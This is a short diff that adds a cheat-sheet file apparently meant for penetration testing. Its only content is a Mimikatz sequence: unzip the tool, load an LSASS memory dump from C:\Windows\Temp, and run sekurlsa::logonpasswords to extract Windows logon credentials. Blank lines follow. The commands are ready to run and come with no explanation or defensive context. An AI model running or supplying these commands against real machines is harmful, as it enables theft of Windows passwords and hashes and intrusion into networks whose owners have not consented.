@@ -1,0 +1,22 @@
+#################### MIMIKATZ ####################
+unzip mimikatz_trunk.zip
+sekurlsa::minidump C:\Windows\Temp\lsass.dmp
+sekurlsa::logonpasswords
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
